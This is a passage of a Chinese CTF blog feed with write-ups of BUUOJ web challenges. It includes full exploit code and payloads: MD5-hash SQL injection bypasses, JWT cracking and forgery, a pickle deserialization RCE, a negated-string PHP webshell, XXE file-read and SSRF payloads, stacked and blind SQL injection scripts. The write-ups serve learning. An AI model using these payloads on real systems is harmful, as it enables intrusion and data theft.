&lt;p&gt;第一种方法是将加密后的密码构造出类似 &#39; or &amp;lsquo;1&amp;rsquo; 的形式&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php

    $v = &#39;a&#39;;

    $payload2 = &amp;quot;&#39;or&#39;&amp;quot;;
    while(1){
        $hash = hash(&amp;quot;md5&amp;quot;,$v,true);
        if(substr_count($hash, $payload2) == 1){
            die($v);     
        }
        $v++;
    }

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这是网上的脚本不过我倒是没跑出来。。。&lt;/p&gt;
&lt;p&gt;这里 &lt;code&gt;$v++&lt;/code&gt; 其实是按照 ascii 字符进行后移的；&lt;/p&gt;
&lt;p&gt;最后可以得到一个结果 &lt;code&gt;ffifdyop&lt;/code&gt;，（还有一个是&lt;code&gt;129581926211651571912466741651878684928&lt;/code&gt;）&lt;/p&gt;
&lt;p&gt;将这个加密回去试试，看到确实是&lt;code&gt;&#39;or&#39;&lt;/code&gt;的形式&lt;/p&gt;
&lt;p&gt;那么只要我们随意输入一个用户名，密码为 &lt;code&gt;ffifdyop&lt;/code&gt; 那么这样我们的语句就变成了：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;select * from users where user = &#39;admin&#39; and password = &#39;&#39;or&#39;6蒥欓!r,b&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样就可成功绕过判断。&lt;/p&gt;
&lt;p&gt;还有一个构造的方法是构造 &lt;code&gt;&#39;=&#39;&lt;/code&gt; 的形式，也就是&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;select * from users where user = &#39;admin&#39; and password = &#39;&#39;=&#39;&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;为什么这样构造可以呢？因为 &lt;code&gt;password = &#39;&#39;=&#39;&#39;&lt;/code&gt; 中，先判断 &lt;code&gt;password =&#39;&#39;&lt;/code&gt; ，这个肯定是返回 0 的，因为 password 中没有&lt;code&gt;&#39;&#39;&lt;/code&gt;这个字段值，前面返回 0 以后，再和后面的等号做比较：&lt;code&gt;0 = &#39;&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;因为后面的根据 php 的弱类型进行判断，0 和字符串比较始终返回 1&lt;/p&gt;
&lt;p&gt;所以整个 sql 语句就相当于：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;select * from users where user = &#39;admin&#39; and 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所以与上面的 &amp;lsquo;or&amp;rsquo; 不同的是，这个需要传入一个存在的用户名才可以正常绕过：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;//by wh1sper
&amp;lt;?php

$v = &#39;a&#39;;

//die(md5(&#39;kydba&#39;,true));

$payload2 = &amp;quot;&#39;=&#39;&amp;quot;;
while(1){
    $hash = hash(&amp;quot;md5&amp;quot;,$v,true);
    if(preg_match(&amp;quot;/^$payload2/i&amp;quot;, $hash)){
        die($v);
    }
    $v++;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到结果是&lt;code&gt;kydba&lt;/code&gt;，加密回去是&lt;code&gt;&#39;=&#39;NJ��s��5�z��@&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;flag{9e92802a-684e-4115-bbe8-f3fdbbf71339}&lt;/p&gt;
</description>
        </item>
        <item>
        <title>BUUOJ刷题记录(2)</title>
        <link>https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/</link>
        <pubDate>Tue, 14 Apr 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170627.png" alt="Featured image of post BUUOJ刷题记录(2)" /&gt;&lt;h3 id=&#34;ciscn2019-华北赛区-day1-web2ikunhttpsbuuojcnchallengesciscn201920华北赛区20day120web2ikun&#34;&gt;[&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[CISCN2019%20%e5%8d%8e%e5%8c%97%e8%b5%9b%e5%8c%ba%20Day1%20Web2]ikun&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CISCN2019 华北赛区 Day1 Web2]ikun&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：简单python脚本、逻辑漏洞、JWT破解与伪造、python反序列化&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165729.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;页面源码里面提示脑洞比较大，给了提示，如上图&lt;/p&gt;
&lt;p&gt;目的是要买到LV6的东西，下面则是500页的商品，需要我们自行寻找。&lt;/p&gt;
&lt;p&gt;在源码里面看到，每个商品的图片就是&lt;code&gt;lv?.png&lt;/code&gt;那么我们推测lv6.png一定存在于某一页。&lt;/p&gt;
&lt;p&gt;写一个脚本找找：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#by wh1sper
import requests

host = &#39;http://7d1e7948-30d9-42b8-b6e6-f74e7fc4a5eb.node3.buuoj.cn/shop?page=&#39;

for i in range(1,500):
    r = requests.get(url=host+str(i))
    if &#39;lv6.png&#39; in r.text:
        print(&#39;page   =  &#39;, i)
        break
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到181，访问之：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://7d1e7948-30d9-42b8-b6e6-f74e7fc4a5eb.node3.buuoj.cn/shop?page=181
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165739.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;不出预料的买不起。。。&lt;/p&gt;
&lt;p&gt;但是我们回头去看burp里面的数据包，发现请求体里面有一个键名为&lt;code&gt;discount=0.8&lt;/code&gt;，改成&lt;code&gt;discount=0.00000000001&lt;/code&gt;试试，果然可以，成功购买了lv6，页面重定向到 &lt;code&gt;/b1g_m4mber&lt;/code&gt; 不过提示这个页面只能admin才能访问。于是我们又回过头去看请求头，发现cookie里面有一个东西叫做&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/cjsblog/p/9277677.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;JWT&lt;/a&gt;（Json Web Token）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndoMXNwZXIifQ.Z3wlMUbdDHNs4x4PiVx43YD-CGibsHUC5f3ApnYId58
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;附上爆破工具GitHub地址：https://github.com/brendan-rius/c-jwt-cracker&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@kali:~/tools/JWTcrake/c-jwt-cracker-master# ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndoMXNwZXIifQ.Z3wlMUbdDHNs4x4PiVx43YD-CGibsHUC5f3ApnYId58
Secret is &amp;quot;1Kun&amp;quot;
root@kali:~/tools/JWTcrake/c-jwt-cracker-master#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在https://jwt.io/这个网站可以进行伪造，把身份改成admin。&lt;/p&gt;
&lt;p&gt;我们就可以愉快的进行伪造了，打开F12-&amp;gt;application-&amp;gt;cookie,将JWT值改成：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;刷新之后我们就是admin啦~&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165817.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;ctrl+U查看源码，提示了&lt;code&gt;/static/asd1f654e683wq/www.zip&lt;/code&gt;网站源码，&lt;/p&gt;
&lt;p&gt;下载下来，发现是python的tornado框架编写的后端&lt;/p&gt;
&lt;p&gt;在/sshop/views/Admin.py里面发现了python反序列化漏洞：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#by wh1sper
#Admin.py
import tornado.web
from sshop.base import BaseHandler
import pickle
import urllib


class AdminHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self, *args, **kwargs):
        if self.current_user == &amp;quot;admin&amp;quot;:
            return self.render(&#39;form.html&#39;, res=&#39;This is Black Technology!&#39;, member=0)
        else:
            return self.render(&#39;no_ass.html&#39;)

    @tornado.web.authenticated
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument(&#39;become&#39;)
            p = pickle.loads(urllib.unquote(become))
            return self.render(&#39;form.html&#39;, res=p, member=1)
        except:
            return self.render(&#39;form.html&#39;, res=&#39;This is Black Technology!&#39;, member=0)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;第21行pickle.loads函数存在&lt;a class=&#34;link&#34; href=&#34;https://www.dazhuanlan.com/2020/02/26/5e55c53a3403f/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;python反序列化漏洞&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;python中的类有一个&lt;code&gt;__reduce__&lt;/code&gt;方法，类似与PHP中的&lt;code&gt;__wakeup__&lt;/code&gt;，在反序列化的时候会自动调用。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;reduce它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。
这个元组包含2到5个元素，其中包括：
一个可调用的对象，用于重建对象时调用；
一个参数元素，供那个可调用对象使用；
被传递给 setstate 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;看一个例子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import pickle
import os
class A(object):
    def __reduce__(self):
        return (os.system,(&#39;ls&#39;,))
a = A()
test = pickle.dumps(a)
pickle.loads(test)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;命令会被执行；&lt;/p&gt;
&lt;p&gt;那么嫖一个exp：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#python2
# coding=utf8
import pickle
import urllib
import commands

class payload(object):
    def __reduce__(self):
        #return (commands.getoutput,(&#39;ls /&#39;,))
        return (commands.getoutput,(&#39;tac /flag.txt&#39;,))

a = payload()
print urllib.quote(pickle.dumps(a))
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;py2跑一下得到：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ccommands%0Agetoutput%0Ap0%0A%28S%27tac%20/flag.txt%27%0Ap1%0Atp2%0ARp3%0A.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;抓包改become=（上面的），可以RCE&lt;/p&gt;
&lt;p&gt;flag{922dd06c-d1e7-4550-b9fd-80332ff3bb87}&lt;/p&gt;
&lt;h3 id=&#34;mrctf2020套娃httpsbuuojcnchallengesmrctf2020套娃&#34;&gt;[&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[MRCTF2020]%e5%a5%97%e5%a8%83&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;MRCTF2020]套娃&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：PHP把.解析为_、JSfuck、data://协议的使用、逆向php算法&lt;/p&gt;
&lt;p&gt;打开题目，源码里面提示：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$query = $_SERVER[&#39;QUERY_STRING&#39;];

 if( substr_count($query, &#39;_&#39;) !== 0 || substr_count($query, &#39;%5f&#39;) != 0 ){
    die(&#39;Y0u are So cutE!&#39;);
}
 if($_GET[&#39;b_u_p_t&#39;] !== &#39;23333&#39; &amp;amp;&amp;amp; preg_match(&#39;/^23333$/&#39;, $_GET[&#39;b_u_p_t&#39;])){
    echo &amp;quot;you are going to the next ~&amp;quot;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;传值：&lt;code&gt;?b.u.p.t=23333%0A&lt;/code&gt;，提示访问&lt;code&gt;secrettw.php &lt;/code&gt;访问之后源码给了JSfuck，复制到控制台运行下得到“POST ME Merak”，post一个键名为Merak的任意值，得到源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Flag is here~But how to get it? 
&amp;lt;?php 
error_reporting(0); 
include &#39;takeip.php&#39;;
ini_set(&#39;open_basedir&#39;,&#39;.&#39;); 
include &#39;flag.php&#39;;

if(isset($_POST[&#39;Merak&#39;])){ 
    highlight_file(__FILE__); 
    die(); 
} 


function change($v){ 
    $v = base64_decode($v); 
    $re = &#39;&#39;; 
    for($i=0;$i&amp;lt;strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo &#39;Local access only!&#39;.&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;;
$ip = getIp();
if($ip!=&#39;127.0.0.1&#39;)
echo &amp;quot;Sorry,you don&#39;t have permission!  Your ip is :&amp;quot;.$ip;
if($ip === &#39;127.0.0.1&#39; &amp;amp;&amp;amp; file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39; ){
echo &amp;quot;Your REQUEST is:&amp;quot;.change($_GET[&#39;file&#39;]);
echo file_get_contents(change($_GET[&#39;file&#39;])); }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;file_get_contents($_GET[&#39;2333&#39;])&lt;/code&gt;需要使用data协议，然后逆向上面的函数就行了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?2333=data://text/plain,todat+is+a+happy+day&amp;amp;file=ZmpdYSZmXGI=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这是脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php

function change($v){
    $v = base64_decode($v);
    $re = &#39;&#39;;
    for($i=0;$i&amp;lt;strlen($v);$i++){
        $re .= chr ( ord ($v[$i]) + $i*2 );
    }
    echo $re;
}
function re($re){
    $v = &#39;&#39;;
    for($i = 0; $i &amp;lt; strlen($re); $i ++){
        $v .= chr( ord($re[$i]) - $i*2);
    }
    echo base64_encode($v),&#39;   &#39;;
    return base64_encode($v);
}

re(&#39;flag.php&#39;);
change(re(&#39;flag.php&#39;));//验证
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag{4a0b1480-dcfa-4f59-aa4b-9db551ec653e}&lt;/p&gt;
&lt;h3 id=&#34;极客大挑战-2019rce-mehttpsbuuojcnchallenges极客大挑战202019rce20me&#34;&gt;[&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98%202019]RCE%20ME&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;极客大挑战 2019]RCE ME&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：&lt;a class=&#34;link&#34; href=&#34;https://www.geek-share.com/detail/2779822280.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;php异或取反绕过正则&lt;/a&gt;、绕过disable_functions执行命令&lt;/p&gt;
&lt;p&gt;先贴一篇：&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/mochu7777777/article/details/104631142&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;&amp;raquo;PHP绕过正则的办法&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本来是比较难的一道题，看了wp做的，可以工具一把梭也可以手撸&lt;/p&gt;
&lt;p&gt;送源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
error_reporting(0);
if(isset($_GET[&#39;code&#39;])){
            $code=$_GET[&#39;code&#39;];
                    if(strlen($code)&amp;gt;40){
                                        die(&amp;quot;This is too Long.&amp;quot;);
                                                }
                    if(preg_match(&amp;quot;/[A-Za-z0-9]+/&amp;quot;,$code)){
                                        die(&amp;quot;NO.&amp;quot;);
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}

// ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;看似很简单，其实学问多，&lt;/p&gt;
&lt;p&gt;传入&lt;code&gt;?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;amp;%ff=phpinfo&lt;/code&gt;可查看phpinfo；&lt;/p&gt;
&lt;p&gt;能看到有很多disable_functions，版本为PHP7&lt;/p&gt;
&lt;p&gt;构造shell连接蚁剑：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php 
  error_reporting(0);
  $a=&#39;assert&#39;;
  $b=urlencode(~$a);
  echo $b;
  echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
  $c=&#39;(eval($_POST[&#39;aaa&#39;]))&#39;;
  $d=urlencode(~$c);
  echo $d;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;%9E%8C%8C%9A%8D%8B
%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%9E%9E%A2%D6%D6
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;playload&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://3494239d-8b3b-438f-9f91-21df2d0ffd65.node3.buuoj.cn/?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%9E%9E%A2%D6%D6);
密码aaa
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以得到一个不能执行命令的shell，&lt;/p&gt;
&lt;p&gt;利用蚁剑的插件“绕过disable_functions”的PHP7_GC_UAF即可执行命令，运行根目录下的readflag就行&lt;/p&gt;
&lt;p&gt;flag{a7900948-cbea-429d-972b-a959c52771be}&lt;/p&gt;
&lt;h3 id=&#34;nctf2019true-xml-cookbookhttpsbuuojcnchallengesnctf2019true20xml20cookbook&#34;&gt;[&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[NCTF2019]True%20XML%20cookbook&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;NCTF2019]True XML cookbook&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：XXE外部实体注入攻击、SSRF&lt;/p&gt;
&lt;p&gt;吊把吊教我打web的🐏出的题，二刷的时候感觉自己今非昔比（大雾&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/3357&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;&amp;raquo;一篇文章带你理解XXE&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这是签到题的升级版，本来是通过XXE读/flag文件的，升级版提示了“尝试用xxe做更多的事情”&lt;/p&gt;
&lt;p&gt;读取&lt;code&gt;/etc/hosts&lt;/code&gt;和&lt;code&gt;/proc/net/arp&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE abc [
  &amp;lt;!ENTITY abc SYSTEM &amp;quot;/proc/net/arp&amp;quot;&amp;gt;
]&amp;gt;
&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;abc;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;2&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到返回信息：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;result&amp;gt;&amp;lt;code&amp;gt;0&amp;lt;/code&amp;gt;&amp;lt;msg&amp;gt;IP address  HW type  Flags  HW address  Mask     Device
173.56.246.2     0x1         0x2         02:42:ad:38:f6:02     *        eth0
&amp;lt;/msg&amp;gt;&amp;lt;/result&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不过原题是给了很多在一个C段下的ip，buu里面只给了两个。&lt;/p&gt;
&lt;p&gt;然后可以通过xxe进行ssrf，这里可以用intruder进行C段爆破，最后是在&lt;code&gt;173.56.246.10&lt;/code&gt;找到了flag&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE abc [
  &amp;lt;!ENTITY abc SYSTEM &amp;quot;php://filter/read=convert.base64-encode/resource=http://173.56.246.10/&amp;quot;&amp;gt;
]&amp;gt;
&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;abc;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;2&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;
&amp;lt;result&amp;gt;&amp;lt;code&amp;gt;0&amp;lt;/code&amp;gt;&amp;lt;msg&amp;gt;ZmxhZ3s4MGYzNGNhOS1kYmUxLTRmZWUtYjEyMi00Njk0NWRmYTQ1NGN9&amp;lt;/msg&amp;gt;&amp;lt;/result&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag{80f34ca9-dbe1-4fee-b122-46945dfa454c}&lt;/p&gt;
</description>
        </item>
        <item>
        <title>BUUOJ刷题记录</title>
        <link>https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</link>
        <pubDate>Sat, 04 Apr 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170627.png" alt="Featured image of post BUUOJ刷题记录" /&gt;&lt;h3 id=&#34;suctf-2019easysqlhttpsbuuojcnchallengessuctf202019easysql&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[SUCTF%202019]EasySQL&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;[SUCTF 2019]EasySQL&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：堆叠注入、MySQL中sql_mode参数&lt;/p&gt;
&lt;p&gt;题目存在过滤，尝试之后发现可以通过&lt;code&gt;0 || 1&lt;/code&gt;这样的语句进行bool盲注，但是此题似乎限制了输入信息的长度，所以这个盲注只能注出来库名&lt;code&gt;CTF&lt;/code&gt;后面的东西就没办法搞，后来看了wp之后才知道存在堆叠注入，尝试之：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;并没有报错，而且返回了查询成功额页面，所以存在堆叠注入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1;show databases;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;返回&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Array ( [0] =&amp;gt; 1 ) Array ( [0] =&amp;gt; ctf ) Array ( [0] =&amp;gt; ctftraining ) Array ( [0] =&amp;gt; information_schema ) Array ( [0] =&amp;gt; mysql ) Array ( [0] =&amp;gt; performance_schema ) Array ( [0] =&amp;gt; test )
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;表名：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1;show tables;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;返回：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Array ( [0] =&amp;gt; 1 ) Array ( [0] =&amp;gt; Flag )
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但是flag关键字被过滤了，&lt;/p&gt;
&lt;p&gt;这就没办法直接查到flag的信息。&lt;/p&gt;
&lt;p&gt;由官方wp的解释来看，这道题目需要我们去对后端语句进行猜测，有点矛盾的地方在于，其描述的功能和实际的功能似乎并不相符，通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用。&lt;/p&gt;
&lt;p&gt;给出的查询语句是：&lt;code&gt;select $_POST[query] || flag from flag&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;预期解是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1;set sql_mode=pipes_as_concat;select 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后有一个非预期是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;*,1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag{05c299f9-2a8b-440e-98d1-d528859be168}&lt;/p&gt;
&lt;p&gt;这里说明一下：&lt;/p&gt;
&lt;h4 id=&#34;sql_modehttpsblogcsdnnetweixin_42373127articledetails88866710&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/weixin_42373127/article/details/88866710&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;sql_mode&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;是一组mysql支持的基本语法及校验规则
查询当前系统sql_mode的设置:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165655.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;其中：&lt;/p&gt;
&lt;p&gt;PIPES_AS_CONCAT：
将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似&lt;/p&gt;
&lt;h3 id=&#34;极客大挑战-2019finalsqlhttpsbuuojcnchallenges极客大挑战202019finalsql&#34;&gt;[&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98%202019]FinalSQL&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;极客大挑战 2019]FinalSQL&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：bool盲注，&lt;code&gt;1^(condition)^1&lt;/code&gt;绕过or被滤，嵌套()绕过空格被过滤&lt;/p&gt;
&lt;p&gt;相比于这个比赛的其他sqli，这道题多了&lt;code&gt;id=&lt;/code&gt;的查询页面，并且提示了是MySQL盲注&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165702.jpeg&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;起初发现了username位置可以用反斜杠逃逸，不过因为所有的注释方法都被过滤了，就没有什么用&lt;/p&gt;
&lt;p&gt;fuzz，常规的单引号，空格，注释，or，|，&amp;amp;都被过滤了。&lt;/p&gt;
&lt;p&gt;随便点一个数字，发现是不用注释的数值型注入（嘿嘿嘿）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;or&lt;/code&gt;被过滤，使用&lt;code&gt;1^(condition)&lt;/code&gt;来绕过：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?id=0
//返回ERROR
?id=0^1
//返回NO! Not this! Click others~~~
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;那么我们注入成功了，不过要把&lt;code&gt;(condition)&lt;/code&gt;换成其他查询语句还需要在末尾再添一个&lt;code&gt;^1&lt;/code&gt;（我也不知道怎么回事儿）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?id=1^((length(database()))&amp;gt;1)^1
//返回NO! Not this! Click others~~~
?id=1^((length(database()))&amp;gt;99)^1
//返回ERROR！！！
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;那么我们可以轻松地区别出bool真假页面返回信息不同&lt;/p&gt;
&lt;p&gt;话不多说，直接上exp：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#by wh1sper
#bool盲注
import requests

host = &#39;http://368375df-ca56-4f5d-8cd4-ab07fb575003.node3.buuoj.cn/search.php?id=&#39;

def mid(bot, top):
    return (int)(0.5*(top + bot))

def sqli():
    name = &#39;&#39;
    for j in range(1, 250):
        top = 126
        bot = 32
        while 1:
            #select = &#39;(ascii(substr(database(),{},1)))&amp;gt;{}&#39;.format(j, mid(top, bot))#---&amp;gt;geek
            #查库名

            #select = &amp;quot;(ascii(substr((select(group_concat(table_name))
            # from(information_schema.tables)where(table_schema=&#39;geek&#39;)),{},1)))&amp;gt;{}&amp;quot;
            # .format(j, mid(top, bot))#---&amp;gt;F1naI1y,Flaaaaag
            #查表名

            #select = &amp;quot;(ascii(substr((select(group_concat(column_name))
            # from(information_schema.columns)where(table_name=&#39;Flaaaaag&#39;)),{},1)))&amp;gt;{}&amp;quot;
            # .format(j, mid(top, bot))#---&amp;gt;id,fl4gawsl
            #查列名
            
            select = &amp;quot;(ascii(substr((select(group_concat(password))&amp;quot; \
                     &amp;quot;from(F1naI1y)),{},1))&amp;gt;{})&amp;quot;.format(j, mid(top, bot))

            playload = &amp;quot;1^(&amp;quot;+select+&amp;quot;)^1&amp;quot;
            #print(playload)
            r = requests.get(url=host+playload)
            #print(r.text)
            if &#39;NO!&#39; in r.text:  # 成功
                if top - 1 == bot:      # top和bot相邻，说明name是top
                    name += chr(top)
                    print(name)
                    break
                bot = mid(bot, top)  # 成功就上移bot
            else:               # 失败
                if top - 1 == bot:      # top和bot相邻，加上失败，说明name是bot
